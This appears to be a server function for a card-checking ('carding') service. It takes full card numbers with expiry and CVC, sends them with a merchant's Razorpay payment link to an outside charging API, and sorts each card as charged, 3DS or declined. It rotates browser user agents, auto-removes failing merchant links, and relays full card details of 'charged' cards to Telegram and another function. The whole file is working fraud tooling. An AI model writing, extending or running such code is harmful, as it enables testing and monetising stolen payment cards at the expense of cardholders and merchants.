import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";

const API_BASE_URL = "https://razorpay-production-4fdd.up.railway.app/razorpay";

const sendAdminDebug = async (
  cc: string,
  status: string,
  message: string,
  rawResponse: string,
  username?: string
) => {
  if (!TELEGRAM_BOT_TOKEN) return;

  try {
    const maskedCard = cc.replace(/^(\d{6})(\d+)(\d{4})/, '$1******$3');
    const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const truncatedRaw = rawResponse.length > 1500 
      ? rawResponse.substring(0, 1500) + '... [truncated]' 
      : rawResponse;
    
    const debugMessage = `🔧 <b>RAZORPAY CHARGE DEBUG</b>

📇 <b>Card:</b> <code>${maskedCard}</code>
👤 <b>User:</b> ${username || 'Unknown'}
📊 <b>Status:</b> ${status.toUpperCase()}
💬 <b>Message:</b> ${message}

━━━━ RAW API RESPONSE ━━━━
<pre>${truncatedRaw}</pre>

🕐 ${timestamp}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_TELEGRAM_CHAT_ID,
        text: debugMessage,
        parse_mode: "HTML",
      }),
    });
  } catch (error) {
    console.error("[RAZORPAY] Failed to send admin debug:", error);
  }
};

const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN" | "3DS",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      user_id: userId,
      card_details: cardDetails,
      status,
      response_message: responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[RAZORPAY] notify-charged-card error:", err));
};

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

const callApi = async (cc: string, site: string): Promise<{ status: string; message: string; rawResponse: string }> => {
  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&site=${encodeURIComponent(site)}`;
  const userAgent = getRandomItem(userAgents);
  
  console.log(`[RAZORPAY] Calling: ${apiUrl}`);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 55000);
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': userAgent,
        'Cache-Control': 'no-cache',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[RAZORPAY] Response: ${rawText}`);
    
    if (!rawText || rawText.trim() === '') {
      return { status: 'unknown', message: 'Empty response', rawResponse: '' };
    }
    
    let apiStatus = 'unknown';
    let apiMessage = rawText;
    
    try {
      const json = JSON.parse(rawText);
      apiMessage = json.message || json.msg || json.error || rawText;
      
      // Primary: Check otpReached first (3DS Required)
      if (json.otpReached === true) {
        apiStatus = '3ds';
        apiMessage = json.message || '3DS Required';
      }
      // success: true = Charged
      else if (json.success === true) {
        apiStatus = 'live';
        apiMessage = json.message || 'Charged';
      }
      // success: false = Declined
      else if (json.success === false) {
        apiStatus = 'dead';
        apiMessage = json.message || json.error || 'Declined';
      }
    } catch {
      // Text response fallback
      const lower = rawText.toLowerCase();
      if (lower.includes('charged') || lower.includes('success')) apiStatus = 'live';
      else if (lower.includes('declined') || lower.includes('error') || lower.includes('failed')) apiStatus = 'dead';
      else if (lower.includes('otp') || lower.includes('3ds')) apiStatus = '3ds';
    }
    
    return { status: apiStatus, message: apiMessage, rawResponse: rawText };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Error';
    console.error(`[RAZORPAY] Error: ${errMsg}`);
    return { status: 'unknown', message: 'Timeout', rawResponse: errMsg };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cc, site } = body;
    
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    if (!site) {
      return new Response(JSON.stringify({ error: 'Site URL required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Quick format validation
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Start API call immediately while auth happens
    const resultPromise = callApi(cc, site);

    // Auth check in parallel
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Ban check and get username
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned, username")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Wait for API result
    const result = await resultPromise;

    // Auto-remove site for known bad responses & unknown errors
    const msgLower = (result.message || '').toLowerCase();
    const rawLower = (result.rawResponse || '').toLowerCase();
    
    let removalReason = '';
    if (rawLower.includes('merchant extraction failed') || rawLower.includes('missing merchant fields')) {
      removalReason = 'Merchant extraction failed / Missing merchant fields';
    } else if (msgLower.includes('international cards are not supported') || msgLower.includes('international card')) {
      removalReason = 'International cards not supported';
    } else if (rawLower.includes('payment page expired') || rawLower.includes('page has expired')) {
      removalReason = 'Payment page expired';
    } else if (rawLower.includes('account is not activated') || rawLower.includes('not activated')) {
      removalReason = 'Account not activated';
    } else if (rawLower.includes('page not found') || rawLower.includes('404') || rawLower.includes('invalid payment link')) {
      removalReason = 'Invalid/dead payment link';
    } else if (result.status === 'unknown' && (!result.rawResponse || result.rawResponse.trim() === '' || msgLower === 'empty response' || msgLower === 'timeout')) {
      removalReason = 'Empty response / Timeout';
    }
    
    if (removalReason) {
      console.log(`[RAZORPAY] Removing site: ${site} - ${removalReason}`);
      const adminClient = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
      adminClient.from('gateway_urls').delete().eq('url', site).then(({ error: delErr }) => {
        if (delErr) console.error('[RAZORPAY] Failed to remove site:', delErr);
        else console.log(`[RAZORPAY] Site removed: ${site}`);
      });

      if (TELEGRAM_BOT_TOKEN) {
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ADMIN_TELEGRAM_CHAT_ID,
            text: `🗑️ <b>SITE AUTO-REMOVED</b>\n\n<code>${site}</code>\n\n<i>Reason: ${removalReason}</i>\n\n━━━━ RAW RESPONSE ━━━━\n<pre>${(result.rawResponse || '').substring(0, 500)}</pre>`,
            parse_mode: "HTML",
          }),
        }).catch(() => {});
      }
    }


    // Map 3ds status
    let computedStatus: string;
    let displayStatus: string;
    
    if (result.status === 'live') {
      computedStatus = 'live';
      displayStatus = 'CHARGED';
    } else if (result.status === '3ds') {
      computedStatus = 'unknown'; // 3DS = unknown for credit purposes (no charge)
      displayStatus = '3DS REQUIRED';
    } else if (result.status === 'dead') {
      computedStatus = 'dead';
      displayStatus = 'PAYMENT FAILED';
    } else {
      computedStatus = 'unknown';
      displayStatus = 'UNKNOWN';
    }
    
    // CHARGED: admin debug + broadcast to channel + notify user
    if (result.status === 'live') {
      sendAdminDebug(
        cc,
        result.status,
        result.message,
        result.rawResponse,
        profile?.username || user.email
      );
      notifyChargedCard(
        user.id,
        cc,
        'CHARGED',
        result.message,
        'RazorPay',
        'RazorPay Charge'
      );
    }
    // UNKNOWN: admin debug only
    else if (computedStatus === 'unknown') {
      sendAdminDebug(
        cc,
        result.status,
        result.message,
        result.rawResponse,
        profile?.username || user.email
      );
    }
    
    return new Response(
      JSON.stringify({
        computedStatus,
        apiStatus: displayStatus,
        apiMessage: result.message,
        is3ds: result.status === '3ds',
        status: computedStatus,
        message: result.message,
        rawResponse: result.rawResponse,
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
